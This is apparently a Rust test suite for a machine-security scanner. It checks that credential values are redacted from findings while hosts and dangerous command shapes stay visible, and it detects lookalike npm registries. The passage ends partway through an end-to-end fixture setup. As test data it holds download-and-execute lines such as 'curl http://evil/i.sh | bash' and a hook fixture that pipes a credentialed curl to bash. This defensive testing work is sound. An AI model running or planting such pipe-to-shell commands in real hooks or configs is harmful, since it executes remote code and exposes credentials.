//! The project's hardest guarantee: a report never contains a secret VALUE.
//!
//! Scanners may record that a credential EXISTS, where it lives, and how it is exposed —
//! never what it is. This suite plants a distinct canary in EVERY surface that echoes
//! user-controlled text into a finding, then asserts no canary reaches any output format.
//!
//! One canary per surface is the point. An earlier version of this check planted two
//! credentials overall, both in surfaces that were already fixed, and so reported a clean
//! bill of health while five other config formats leaked verbatim.

use rustmachineguard::scanners::redact_secrets_in_text as redact;

/// Every (label, raw text) pair a scanner may store. The label is the canary.
fn surfaces() -> Vec<(&'static str, String)> {
    vec![
        // --- package/registry configs: credentials ride in the URL authority ---
        ("NPMREG", "registry=https://u:NPMREG@npm.internal/".into()),
        ("NPMTOK", "//npm.internal/:_authToken=NPMTOK".into()),
        ("PIPIDX", "index-url = https://u:PIPIDX@pypi.internal/simple".into()),
        ("PIPHOST", "trusted-host = u:PIPHOST@pypi.internal".into()),
        ("BUNREG", "registry = \"https://u:BUNREG@npm.internal/\"".into()),
        ("BUNSCOPE", "\"@acme\" = \"https://u:BUNSCOPE@npm.internal/\"".into()),
        ("YARNCLASSIC", "registry \"https://u:YARNCLASSIC@npm.internal/\"".into()),
        ("YARNBERRY", "registry: \"https://u:YARNBERRY@npm.internal/\"".into()),
        // --- command lines stored as finding evidence ---
        ("HOOKENV", "AWS_SECRET_ACCESS_KEY=HOOKENV ./deploy.sh".into()),
        ("HOOKFLAG", "./publish --token HOOKFLAG".into()),
        ("TASKHDR", "curl -H Authorization: Bearer TASKHDR https://x".into()),
        ("MCPARG", "npx server --api-key MCPARG".into()),
        // git_config.rs stores the VALUE alone, so that is what redaction sees. The
        // git credential protocol spells the field `password=`.
        ("GITCRED", "!f(){ echo password=GITCRED; }".into()),
        // --- separator variants: a secret must not hide behind a tab or newline ---
        ("TABSEP", "--password\tTABSEP".into()),
        ("NLSEP", "password:\nNLSEP".into()),
        // --- scheme-less userinfo, as git remotes and pip write it ---
        ("SCHEMELESS", "u:SCHEMELESS@host.internal".into()),
        // Found by the property test: a query-string '=' made the URL look like key=value.
        ("URLQUERY", "https://u:URLQUERY@host.internal/simple?q=1&x=2".into()),
        // --- shapes found by the adversarial review of 823f59d..7934d75 ---
        ("QUERYMID", "https://h.internal/p?a=1&token=QUERYMID".into()),
        ("CONNSTR", "Server=db;User Id=sa;Password=CONNSTR;".into()),
        ("HDRNOSPACE", "curl -H X-Api-Key:HDRNOSPACE https://api.internal".into()),
        (
            "JSONBODY",
            "curl -d '{\"token\":\"JSONBODY\"}' https://api.internal/x".into(),
        ),
        (
            "AUTHEQ",
            "curl -H \"Authorization=Bearer AUTHEQ\" https://api.internal".into(),
        ),
        (
            "AUTHCOLON",
            "curl -H Authorization:Bearer AUTHCOLON https://api.internal".into(),
        ),
        ("INISPACED", "password = INISPACED".into()),
        ("CURLU", "curl -u admin:CURLU https://api.internal".into()),
        ("USEREQ", "curl --user=admin:USEREQ https://api.internal".into()),
        (
            "MCPHDR",
            "mcp-remote https://r.internal/sse --header Authorization: Bearer MCPHDR".into(),
        ),
        ("TABKV", "export\tGITHUB_TOKEN=TABKV".into()),
        // --- round two: non-Bearer schemes, base64 padding, wget headers, JSON, lists ---
        (
            "AUTHTOKEN",
            "curl -H \"Authorization: token AUTHTOKEN\" https://api.internal".into(),
        ),
        ("AUTHDRF", "Authorization: Token AUTHDRF".into()),
        ("AUTHSSWS", "Authorization: SSWS AUTHSSWS".into()),
        ("AUTHOAUTH", "Proxy-Authorization: OAuth AUTHOAUTH".into()),
        ("B64PAD2", "X-Api-Key:B64PAD2==".into()),
        ("B64PAD1", "X-Api-Key:B64PAD1=".into()),
        (
            "WGETHDR",
            "wget --header=\"Private-Token: WGETHDR\" https://gl.internal".into(),
        ),
        (
            "WGETHDR2",
            "wget --header=X-Api-Key:WGETHDR2 https://gl.internal".into(),
        ),
        ("JSON2ND", "-d {\"username\":\"admin\",\"password\":\"JSON2ND\"}".into()),
        ("JSONSP", "-d '{\"token\" : \"JSONSP\"}'".into()),
        ("CSVKV", "--env a=1,token=CSVKV,b=2".into()),
        ("AUTHQ", "-H 'Authorization: token AUTHQ' https://api.internal".into()),
        // A secret containing separators must vanish whole, not just its first piece.
        (
            "SEPSECRET",
            "password=SEPSECRETa;SEPSECRETb,SEPSECRETc&SEPSECRETd".into(),
        ),
        ("SEPCONN", "Server=db;Password=SEPCONNa;SEPCONNb;Trusted=true".into()),
        // --- round three: header name as the tail of a k=v / glued / quoted token ---
        (
            "WGETAUTH",
            "wget --header=\"Authorization: token WGETAUTH\" https://api.gh.internal".into(),
        ),
        (
            "WGETAUTHSQ",
            "wget --header='Authorization: Token WGETAUTHSQ' https://api.gh.internal".into(),
        ),
        (
            "GLUEDH",
            "curl -H\"Authorization: SSWS GLUEDH\" https://okta.internal".into(),
        ),
        ("HTTPIE", "http POST https://h Authorization:\"Bearer HTTPIE\"".into()),
        ("JSONAUTH", "-d {\"Authorization\":\"Bearer JSONAUTH\"}".into()),
        ("QSPACE", "mysql --password \"first QSPACE\" -e select".into()),
        ("QSPACE2", "export TOKEN=\"a QSPACE2 c\"".into()),
        ("QSPACE3", "-d 'password=my QSPACE3'".into()),
        // --- agent-surface detections (2026-10): skill dynamic context, settings
        // helpers, and the host values read from .env / OLLAMA_HOST ---
        ("SKILLDYN", "deploy --token SKILLDYN".into()),
        ("HELPERTOK", "./key.sh --token HELPERTOK".into()),
        ("PROXYUSER", "http://u:PROXYUSER@proxy.internal:3128".into()),
        ("OLLAMAUSER", "http://u:OLLAMAUSER@0.0.0.0:11434".into()),
        // --- bare vendor-shaped keys with no key name or flag in front of them ---
        ("ANTBARE", "echo sk-ant-api03-ANTBARE0123456789abcdefghij".into()),
        ("PROJBARE", "printf %s sk-proj-PROJBARE0123456789abcdef | x".into()),
        (
            "GHPBARE",
            "gh auth login --with-token ghp_GHPBARE0123456789abcdefgh".into(),
        ),
        (
            "BAREKEYXYZ",
            "aws configure set aws_access_key_id AKIABAREKEYXYZ123456".into(),
        ),
        ("SLACKBARE", "notify xoxb-SLACKBARE-0123456789".into()),
        (
            "GOOGBARE",
            "gemini --key AIzaGOOGBARE0123456789abcdefghijklmnopq".into(),
        ),
        // --- backslash escapes keep a secret's tail inside its shell word (fail on f2572b2) ---
        (
            "ESCHDR",
            r"wget --header=Authorization:Bearer\ ESCHDR https://api.internal".into(),
        ),
        (
            "ESCHDR2",
            r"curl -H Authorization:\ Bearer\ ESCHDR2 https://api.internal".into(),
        ),
        (
            "ESCAPIKEY",
            r"curl -H X-Api-Key:a\ ESCAPIKEY https://api.internal".into(),
        ),
        (
            "ESCCOOKIE",
            r"curl -H Cookie:\ sid=ESCCOOKIE https://app.internal".into(),
        ),
        (
            "ESCDATA",
            r"curl --data password=a\ ESCDATA https://api.internal".into(),
        ),
        ("ESCUSER", r"curl -u admin:a\ ESCUSER https://api.internal".into()),
        ("ESCKV", r"API_KEY=va\ ESCKV ./run.sh".into()),
        ("ESCFLAG", r"tool --password a\ ESCFLAG".into()),
        ("ESCURL", r"git clone https://u:a\ ESCURL@git.internal/r".into()),
        ("ESCANSIC", r"TOKEN=$'a ESCANSIC' ./run.sh".into()),
        ("ESCDQ", r#"tool --password "a\" ESCDQ""#.into()),
        ("ESCGLUE", r"TOKEN='a'\ ESCGLUE ./run.sh".into()),
        (
            "ESCQHDR",
            r#"curl -H "Authorization: Bearer \"a ESCQHDR\"" https://api.internal"#.into(),
        ),
        ("ESCCONT", "tool --token \\\n  ESCCONT https://api.internal".into()),
    ]
}

/// Credential helpers print a credential, so only their SHAPE is recorded: the program
/// (a path or a known tool), flag names and exact $VAR references. Every other literal
/// goes, wherever the shell grammar puts it: echo/printf arguments, heredoc
/// bodies, NAME=value values, `sh -c` strings (redacted as nested commands), subshells
/// and brace groups, wrapper prefixes (exec, sudo, command, builtin, time, env) and
/// interpreter code passed to -c / -e.
#[test]
fn helper_command_literals_are_redacted() {
    use rustmachineguard::scanners::redact_helper_command as h;
    for (canary, raw) in [
        ("LITELLMLIT", "echo litellm-LITELLMLIT0123456789abcdef"),
        ("PLAINHUNTER", "MYPASS=PLAINHUNTER aws sso login"),
        ("HEREDOCKEY", "cat <<EOF\nHEREDOCKEY\nEOF"),
        ("HERESTR", "cat <<<HERESTR"),
        ("OPAQUEKEY", "./helper --profile x OPAQUEKEY0123456789abcdefXYZ"),
        ("ECHOQ", "echo -n 'ECHOQ'; true"),
        ("PIPEDKEY", "echo PIPEDKEY | base64"),
        // Review round 3: wrapped forms that used to pass through verbatim.
        ("Hunter2Pass", "/usr/bin/env echo Hunter2Pass"),
        ("Hunter2Pass", "command echo Hunter2Pass"),
        ("Hunter2Pass", "builtin echo Hunter2Pass"),
        ("Hunter2Pass", "sh -c 'echo Hunter2Pass'"),
        ("Hunter2Pass", "bash -c \"printf %s Hunter2Pass\""),
        ("Hunter2Pass", "bash -lc 'exec echo Hunter2Pass'"),
        ("Hunter2Pass", "(echo Hunter2Pass)"),
        ("Hunter2Pass", "{ echo Hunter2Pass; }"),
        ("Hunter2Pass", "exec echo Hunter2Pass"),
        ("Hunter2Pass", "sudo echo Hunter2Pass"),
        ("Hunter2Pass", "sudo -u root echo Hunter2Pass"),
        ("Hunter2Pass", "time echo Hunter2Pass"),
        ("Hunter2Pass", "env -i FOO=1 echo Hunter2Pass"),
        ("Hunter2Pass", "node -e \"console.log('Hunter2Pass')\""),
        ("Hunter2Pass", "python3 -c 'print(\"Hunter2Pass\")'"),
        ("Hunter2Pass", "awk 'BEGIN{print \"Hunter2Pass\"}'"),
        ("Hunter2Pass", "eval 'echo Hunter2Pass'"),
        ("Hunter2Pass", "true && echo Hunter2Pass"),
        ("Hunter2Pass", "mysql -pHunter2Pass -e 'select 1'"),
        ("Hunter2Pass", "vault-cli --password=Hunter2Pass"),
        ("Hunter2Pass", "mytool Hunter2Pass"),
        ("Hunter2Pass", "cat x # Hunter2Pass"),
        ("Hunter2Pass", "sh -c \"sh -c 'echo Hunter2Pass'\""),
        (
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ",
            "sh -c 'echo abcdefghijklmnopqrstuvwxyzABCDEFGHIJ'",
        ),
        (
            "dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU",
            "exec echo dGhpcyBpcyBhIHNlY3JldCBrZXkgdmFsdWU=",
        ),
        (
            "my-very-secret-password-value",
            "sudo echo my-very-secret-password-value",
        ),
        (
            "correcthorsebatterystaple",
            "python3 -c \"print('correcthorsebatterystaple')\"",
        ),
        ("correcthorsebatterystaple", "printf '%s\\n' correcthorsebatterystaple"),
        ("Hunter2Pass", "curl -s https://u:Hunter2Pass@vault.internal/v1/x"),
        ("Hunter2Pass", "curl -s https://vault.internal/v1/x?token=Hunter2Pass"),
        // Review round 6: eval words shaped one by one, quote-concatenated references,
        // literals in program, long-flag, host and path positions.
        ("Zq9Hunter2Pw", "eval echo Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "command eval echo Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "sh -c 'eval echo Zq9Hunter2Pw'"),
        ("Zq9Hunter2Pw", "eval mytool Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "true && eval echo Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "eval -- echo Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "builtin eval echo Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "echo $x\"Zq9Hunter2Pw\""),
        ("Zq9Hunter2Pw", "echo \"$x\"Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool --Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool https://Zq9Hunter2Pw.example.com/"),
        ("Zq9Hunter2Pw", "Zq9Hunter2Pw --flag"),
        ("Zq9Hunter2Pw", "(cd /tmp && Zq9Hunter2Pw)"),
        ("Zq9Hunter2Pw", "cat /tmp/Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool ./Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool ~/Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool <<< Zq9Hunter2Pw"),
        ("Zq9Hunter2Pw", "mytool $'Zq9Hunter2Pw'"),
    ] {
        let out = h(raw);
        assert!(!out.contains(canary), "{raw:?} -> {out:?}");
        assert!(
            out.contains("<redacted>") || out.contains("<program>"),
            "{raw:?} -> {out:?}"
        );
    }
    // Shape only (review round 6): known programs and program paths, flag names, exact
    // $VAR references, operators. Subcommands, paths, hosts and every other word go.
    for (raw, want) in [
        ("op read op://vault/anthropic/key", "op <redacted> <redacted>"),
        (
            "aws sso login --profile dev",
            "aws <redacted> <redacted> --profile <redacted>",
        ),
        (
            "security find-generic-password -s ANTHROPIC_API_KEY -w",
            "security <redacted> -s <redacted> -w",
        ),
        ("echo $ANTHROPIC_API_KEY", "echo $ANTHROPIC_API_KEY"),
        ("printenv ANTHROPIC_API_KEY", "printenv <redacted>"),
        (
            "/usr/local/bin/key-helper-2024 --region us-east-1",
            "/usr/local/bin/key-helper-2024 --region <redacted>",
        ),
        (
            "echo $KEY | curl -d @- https://x.example",
            "echo $KEY | curl -d <redacted> <redacted>",
        ),
        ("gcloud auth print-access-token", "gcloud <redacted> <redacted>"),
        ("cat ~/.config/anthropic/key 2>/dev/null", "cat <redacted> 2>/dev/null"),
        ("sh -c 'echo $KEY'", "sh -c 'echo $KEY'"),
        ("sudo -u svc /opt/bin/get-key", "sudo -u <redacted> /opt/bin/get-key"),
        ("cat <<EOF\nHEREDOCKEY\nEOF", "cat <<EOF\n<redacted>\nEOF"),
        ("mytool --profile=\"$P\"", "<program> --profile=\"$P\""),
    ] {
        assert_eq!(h(raw), want, "{raw:?}");
    }
}

/// The host-only readers never return userinfo, independent of redaction.
#[test]
fn host_readers_drop_userinfo() {
    let (shown, bind) =
        rustmachineguard::scanners::shell_configs::classify_ollama_host("http://u:OLLAMAUSER@0.0.0.0:11434");
    assert!(!shown.contains("OLLAMAUSER"), "{shown}");
    assert_eq!(bind, "wildcard");
    let redacted = redact("http://u:PROXYUSER@proxy.internal:3128");
    assert!(redacted.contains("proxy.internal"), "the host must survive: {redacted}");
}

#[test]
fn no_canary_survives_redaction() {
    let mut leaked = Vec::new();
    for (canary, raw) in surfaces() {
        let out = redact(&raw);
        if out.contains(canary) {
            leaked.push(format!("  {canary}: {raw:?} -> {out:?}"));
        }
    }
    assert!(
        leaked.is_empty(),
        "secret values reached a finding:\n{}",
        leaked.join("\n")
    );
}

/// The idempotency fix (C1: redaction repeated to its fixed point, userinfo and pair
/// rules made consistent) must not redact LESS: every canary is still gone after one
/// pass and after two, through both report-facing redactors, and the second pass
/// changes nothing.
#[test]
fn every_canary_stays_redacted_and_redaction_is_idempotent() {
    use rustmachineguard::scanners::redact_command_text;
    for (canary, raw) in surfaces() {
        for (name, f) in [
            ("redact_secrets_in_text", redact as fn(&str) -> String),
            ("redact_command_text", redact_command_text),
        ] {
            let once = f(&raw);
            let twice = f(&once);
            assert!(!once.contains(canary), "{name}: {canary} survived: {raw:?} -> {once:?}");
            assert_eq!(twice, once, "{name}: not idempotent on {raw:?}");
        }
    }
}

/// Redaction must not blind detection. The parts of a command that make it DANGEROUS —
/// the binary, the pipe-to-shell, the auth scheme, the host — have to stay visible, or
/// the finding is unactionable even though it is technically secret-free.
#[test]
fn redaction_preserves_the_actionable_parts() {
    let cases = [
        (
            "AWS_SECRET_ACCESS_KEY=s3cr3t ./deploy.sh --token hunter2 | bash",
            vec!["./deploy.sh", "| bash", "AWS_SECRET_ACCESS_KEY"],
        ),
        (
            "curl -H Authorization: Bearer tok123 https://api.example.com",
            vec!["curl", "Bearer", "https://api.example.com"],
        ),
        (
            "registry=https://u:p@npm.evil.example.com/",
            vec!["registry", "npm.evil.example.com"],
        ),
        (
            "trusted-host = u:p@pypi.internal",
            vec!["trusted-host", "pypi.internal"],
        ),
        // The `!` shell-escape is why a credential.helper is dangerous at all.
        ("!f(){ echo password=hunter2; }", vec!["!f(){", "echo"]),
        // The review's "off by one" shapes: the secret must go and the URL must stay.
        (
            "curl -H X-Api-Key:S3 https://api.internal",
            vec!["curl", "X-Api-Key:", "https://api.internal"],
        ),
        (
            "curl -d '{\"token\":\"S4\"}' https://api.internal/x",
            vec!["'{\"token\":\"<redacted>\"}'", "https://api.internal/x"],
        ),
        (
            "curl -u admin:S5 https://api.internal",
            vec!["admin:<redacted>", "https://api.internal"],
        ),
        (
            "curl -H \"Authorization=Bearer S6\" https://api.internal",
            vec!["Authorization=Bearer", "https://api.internal"],
        ),
        (
            "Server=db;User Id=sa;Password=S7;",
            vec!["Server=db;", "Id=sa;", "Password=<redacted>;"],
        ),
        (
            "Server=db;Password=a;b;Trusted=true",
            vec!["Server=db;", "Password=<redacted>;<redacted>;", "Trusted=true"],
        ),
        // Round three: a scheme word as an ordinary value must not eat the next token,
        // and the command after ';' in a shell one-liner is the finding.
        (
            "A_KEY=basic .vscode/setup.mjs",
            vec!["A_KEY=<redacted>", ".vscode/setup.mjs"],
        ),
        (
            "X_TOKEN=1;.vscode/setup.mjs",
            vec!["X_TOKEN=<redacted>;.vscode/setup.mjs"],
        ),
        (
            "wget --header=\"Authorization: token S13\" https://api.gh.internal",
            vec!["--header=\"Authorization:", "token", "https://api.gh.internal"],
        ),
        (
            "http POST https://h Authorization:\"Bearer S14\"",
            vec!["https://h", "Authorization:\"Bearer", "<redacted>\""],
        ),
        (
            "mysql --password \"first S15\" -e select",
            vec!["--password", "-e select"],
        ),
        ("https://h/p?a=1&token=S8&b=2", vec!["https://h/p?a=1&", "&b=2"]),
        // Round two: the scheme word stays, the credential goes, the URL survives.
        (
            "curl -H \"Authorization: token S9\" https://api.internal",
            vec!["Authorization:", "token", "<redacted>\"", "https://api.internal"],
        ),
        (
            "wget --header=\"Private-Token: S10\" https://gl.internal",
            vec!["--header=\"Private-Token:", "https://gl.internal"],
        ),
        (
            "X-Api-Key:S11== https://api.internal",
            vec!["X-Api-Key:<redacted>", "https://api.internal"],
        ),
        (
            "-d {\"username\":\"admin\",\"password\":\"S12\"}",
            vec!["\"username\":\"admin\"", "\"password\":\"<redacted>\"}"],
        ),
    ];
    for (raw, must_keep) in cases {
        let out = redact(raw);
        for keep in must_keep {
            assert!(
                out.contains(keep),
                "redaction destroyed the finding: {raw:?} -> {out:?} (lost {keep:?})"
            );
        }
    }
}

/// Values that only LOOK like credentials must survive intact, or every report fills
/// with `<redacted>` noise and users stop reading it.
#[test]
fn redaction_leaves_non_secrets_alone() {
    for benign in [
        "git@github.com:lexicone42/rustmachineguard.git",
        "user@example.com",
        "npx -y @modelcontextprotocol/server-filesystem /home/u",
        "cert = /etc/ssl/corp-ca.pem",
        "https://registry.npmjs.org/",
        "node --max-old-space-size=4096 index.js",
        // Bare words are not markers: `auth` here is a subcommand, `login` is not a secret.
        "gh auth login --with-token",
        // Single-letter flags are not markers: -u is unbuffered, -p is a port or mkdir -p.
        "python -u script.py",
        "mkdir -p /srv/app && ssh -p 22 host",
        "docker run -p 8080:80 nginx",
        "git@github.com:org/repo.git",
        // Scheme words are ordinary words outside an Authorization header.
        "gh auth token",
        "vault token lookup",
        "curl -H 'Accept: application/json, text/plain' https://api.internal/v1/token/refresh",
        "curl -H Accept:\"application/json\" https://api.internal",
        "MODE=basic ./run.sh",
        "ls /etc/ssl/private/",
    ] {
        assert_eq!(redact(benign), benign, "over-redacted a benign value");
    }
}

/// A lookalike registry must not be mistaken for the official one. `contains()` matching
/// treated `registry.npmjs.org.evil.example.com` as npm's own registry, so a host that
/// receives every install and every auth token produced no finding at all.
#[test]
fn lookalike_registry_is_not_official() {
    use rustmachineguard::scanners::is_official_registry as official;
    let npm = &["registry.npmjs.org"][..];
    for hostile in [
        "https://registry.npmjs.org.evil.example.com/",
        "https://evil.example.com/registry.npmjs.org",
        "https://registry.npmjs.org@evil.example.com/",
        "https://registry-npmjs-org.evil.example.com/",
        "\"https://registry.npmjs.org.evil.example.com/\"",
        // WHATWG: a backslash is a path separator for special schemes, so npm's host
        // here is evil.com and `/@registry.npmjs.org/` is the path.
        "https://evil.com\\@registry.npmjs.org/",
        "http://127.0.0.1:4873\\@registry.npmjs.org/",
        // Credentials in front of the host are never "just the official registry".
        "https://u:p@registry.npmjs.org/",
    ] {
        assert!(!official(hostile, npm), "lookalike accepted as official: {hostile}");
    }
    for benign in [
        "https://registry.npmjs.org/",
        "https://registry.npmjs.org",
        "\"https://registry.npmjs.org/\"",
        "https://REGISTRY.NPMJS.ORG/",
        "https://registry.npmjs.org:443/",
    ] {
        assert!(official(benign, npm), "official registry flagged as custom: {benign}");
    }
}

mod redaction_properties {
    use proptest::prelude::*;
    use rustmachineguard::scanners::redact_secrets_in_text as redact;

    // A secret shape that cannot occur inside the filler tokens, so a `contains` check
    // can never be fooled by coincidence. Filler never starts with '-': `-key` IS a
    // flag-shaped secret marker, and redacting the token after it is correct.
    const SECRET: &str = "[0-9]{4}[A-Z]{4}[a-z0-9]{4,20}";
    const FILLER: &str = "([a-z./][a-z./-]{0,11})?";

    fn key() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec![
            "TOKEN",
            "SECRET",
            "API_KEY",
            "PASSWORD",
            "AWS_SECRET_ACCESS_KEY",
            "GH_TOKEN",
            "npm_token",
            "DATABASE_PASSWORD",
            "client_secret",
        ])
    }
    fn sep() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec![" ", "\t", "\n", "  ", " \t "])
    }
    // No single-letter flags here on purpose: `-p` is a port or `mkdir -p` as often as a
    // password, so the helper does not treat it as a secret marker (see
    // is_secret_value_position). Only names carrying a secret hint qualify.
    fn flag() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec!["--token", "--password", "--api-key", "--secret", "--auth-token"])
    }

    /// A generated flag word that names a secret (an independent, deliberately broad
    /// over-approximation of the redactor's rule): a long hint word anywhere in a flag,
    /// or a short hint word in a flag with word structure (`--sk`, `-a-pat`). A bare
    /// single-dash cluster (`-sk`, `-pat`, `-sk_`) is never one by a short hint.
    fn names_a_secret_flag(t: &str) -> bool {
        let Some(name) = t.strip_prefix('-') else { return false };
        let name = name.trim_end_matches(|c: char| !c.is_ascii_alphanumeric());
        let long = [
            "token",
            "secret",
            "key",
            "password",
            "passwd",
            "passphrase",
            "credential",
            "auth",
            "private",
        ];
        let short = ["pass", "pwd", "pat", "jwt", "sk"];
        let cluster = !name.is_empty() && name.bytes().all(|b| b.is_ascii_alphanumeric());
        long.iter().any(|h| name.contains(h)) || (!cluster && short.iter().any(|h| name.contains(h)))
    }

    proptest! {
        /// KEY=value with a secret-named key: the value never survives, whatever the
        /// separator, and the key and surrounding tokens do.
        #[test]
        fn key_value_secret_never_survives(
            pre in FILLER, post in FILLER, k in key(), s in SECRET, sp in sep(),
        ) {
            let input = format!("{pre}{sp}{k}={s}{sp}{post}");
            let out = redact(&input);
            prop_assert!(!out.contains(&s), "{input:?} -> {out:?}");
            prop_assert!(out.contains(k));
            prop_assert!(out.contains(pre.as_str()) && out.contains(post.as_str()));
        }

        /// URL userinfo, with and without a scheme: credential gone, host kept.
        #[test]
        fn userinfo_secret_never_survives(pre in FILLER, s in SECRET, scheme in prop::bool::ANY) {
            let url = if scheme { format!("https://user:{s}@host.example/p?q=1") }
                      else      { format!("user:{s}@host.example") };
            let out = redact(&format!("{pre} {url}"));
            prop_assert!(!out.contains(&s), "{url:?} -> {out:?}");
            prop_assert!(out.contains("host.example"));
        }

        /// Value-position secrets: the token after `Bearer`, `Authorization:`, or a
        /// secret-named flag, across every whitespace separator.
        #[test]
        fn value_position_secret_never_survives(s in SECRET, sp in sep(), f in flag(), pre in FILLER) {
            for input in [
                format!("{pre} Authorization:{sp}Bearer{sp}{s}"),
                format!("{pre} {f}{sp}{s}"),
                format!("{pre} password:{sp}{s}"),
            ] {
                let out = redact(&input);
                prop_assert!(!out.contains(&s), "{input:?} -> {out:?}");
            }
        }

        /// A secret whose word continues past a backslash-escaped space (`KEY=a\ S`,
        /// `--flag a\ S`, `Authorization:Bearer\ S`, `-u u:a\ S`, `https://u:a\ S@h`):
        /// the whole word is the secret, in both redactors, and redaction is idempotent.
        #[test]
        fn escaped_space_secret_never_survives(
            k in key(), f in flag(), s in SECRET, pre in "[a-z]{1,6}", post in FILLER,
            esc in prop::sample::select(vec!["\\ ", "\\\t", "\\ \\ "]),
        ) {
            use rustmachineguard::scanners::redact_command_text;
            for input in [
                format!("{k}={pre}{esc}{s} {post}"),
                format!("tool {f} {pre}{esc}{s} {post}"),
                format!("curl -H Authorization:Bearer{esc}{s} {post}"),
                format!("wget --header=Authorization:{esc}token{esc}{s} {post}"),
                format!("curl -u {pre}:{pre}{esc}{s} {post}"),
                format!("git clone https://{pre}:{pre}{esc}{s}@host.example/r {post}"),
                format!("{k}='{pre}'{esc}{s} {post}"),
            ] {
                for out in [redact(&input), redact_command_text(&input)] {
                    prop_assert!(!out.contains(&s), "{input:?} -> {out:?}");
                }
                let once = redact_command_text(&input);
                prop_assert_eq!(redact_command_text(&once), once.clone());
                let once = redact(&input);
                prop_assert_eq!(redact(&once), once.clone());
            }
        }

        /// Redacting twice is the same as redacting once: a redacted report re-fed
        /// through the tool (fleet aggregation, --diff) must not mutate further.
        #[test]
        fn redaction_is_idempotent(s in "\\PC{0,200}") {
            let once = redact(&s);
            prop_assert_eq!(redact(&once), once.clone());
        }

        /// Text with no secret shapes passes through byte-for-byte. Short-flag clusters
        /// (`-sk`, `-pat`) are NOT secret shapes: this shrank to `-sk a` -> `-sk
        /// <redacted>` when the last-word hints (SK, PAT, ...) applied to them. A flag
        /// that does name a secret (`--sk a`, `-db-pass a`, `-key a`) can be generated
        /// too, rarely, and redacting its value is correct, so such inputs are skipped.
        #[test]
        fn plain_command_lines_are_untouched(cmd in "[a-z0-9 ./_-]{0,80}") {
            prop_assume!(!cmd.split_whitespace().any(names_a_secret_flag));
            prop_assert_eq!(redact(&cmd), cmd.clone());
        }

        /// Any single-dash letter cluster in front of a path and a URL is left alone by
        /// both redactors, unless it spells a long hint word (`-key`, `-token`).
        #[test]
        fn short_flag_clusters_never_redact_the_next_word(
            prog in prop::sample::select(vec!["curl", "wget", "git", "ssh", "gh", "kubectl", "tool"]),
            cluster in "-[a-zA-Z]{1,6}",
        ) {
            prop_assume!(!names_a_secret_flag(&cluster.to_ascii_lowercase()));
            let cmd = format!("{prog} {cluster} out/a.txt https://api.internal/v1/run");
            prop_assert_eq!(redact(&cmd), cmd.clone());
            prop_assert_eq!(rustmachineguard::scanners::redact_command_text(&cmd), cmd.clone());
        }
    }
}

/// MCP launch args go through `mcp::redact_arg`, NOT directly through the shared helper.
/// The first version of this suite asserted the MCP surface against a function that
/// surface never called, so it could not fail while `--header "Authorization: Bearer x"`
/// and connection strings reached JSON and Blueprint verbatim. Test the real entry point.
#[test]
fn mcp_redact_arg_covers_header_and_connection_string_shapes() {
    use rustmachineguard::scanners::mcp::redact_arg;
    assert_eq!(redact_arg("MCPARG", Some("--api-key")), "<redacted>");
    assert_eq!(
        redact_arg("Authorization: Bearer HDRTOK", Some("--header")),
        "Authorization: Bearer <redacted>"
    );
    assert_eq!(
        redact_arg("Authorization: Bearer HDRTOK2", Some("-H")),
        "Authorization: Bearer <redacted>"
    );
    assert_eq!(
        redact_arg("Server=db;User Id=sa;Password=PW;", Some("--connection-string")),
        "Server=db;User Id=sa;Password=<redacted>;"
    );
    assert_eq!(
        redact_arg("postgresql://u:pw@db/x", None),
        "postgresql://<redacted>@db/x"
    );
    // Not a secret: the download-and-execute shape must survive intact.
    assert_eq!(
        redact_arg("curl http://evil/i.sh | bash", None),
        "curl http://evil/i.sh | bash"
    );
}

/// The whole guarantee, end to end, against the real binary: plant a distinct canary in
/// every surface that echoes user-controlled text, render every output format, and
/// assert none survives. Each fixture also carries a POSITIVE control (its host name),
/// asserted present in the JSON, so a fixture the scanner never read cannot pass as
/// "clean" -- which is exactly how the earlier two-canary check reported success.
#[test]
fn no_canary_reaches_any_output_format_end_to_end() {
    use std::collections::BTreeSet;
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-canary-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    let proj = home.join("proj");
    fs::create_dir_all(proj.join(".claude")).unwrap();
    fs::create_dir_all(proj.join(".vscode")).unwrap();
    fs::create_dir_all(home.join(".pip")).unwrap();
    fs::write(
        home.join(".claude.json"),
        format!(
            r#"{{"projects":{{"{p}":{{}}}},"mcpServers":{{
              "remote":{{"command":"npx","args":["mcp-remote","https://r.internal/sse","--header","Authorization: Bearer E2EMCPHDR"]}},
              "db":{{"command":"npx","args":["mssql-mcp","--connection-string","Server=db.internal;User Id=sa;Password=E2ECONNSTR;"]}},
              "k":{{"command":"npx","args":["some-mcp","--api-key","E2EAPIKEY","https://k.internal/"]}},
              "gh":{{"command":"npx","args":["mcp-remote","https://gh.internal/sse","--header","Authorization: token E2EGHTOKEN"]}},
              "cmd":{{"command":"npx -y some-srv --token E2ECMDTOK https://cmd.internal/","args":[]}}}}}}"#,
            p = proj.display()
        ),
    )
    .unwrap();
    fs::write(
        proj.join(".claude/settings.json"),
        r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"curl -H X-Api-Key:E2EHDR -H X-Auth:E2EB64PAD== -H \"Authorization: token E2EHOOKGH\" -u admin:E2ECURLU 'https://deploy.internal/?a=1&token=E2EQUERY' | bash"}]}]}}"#,
    )
    .unwrap();
    fs::write(
        proj.join(".vscode/tasks.json"),
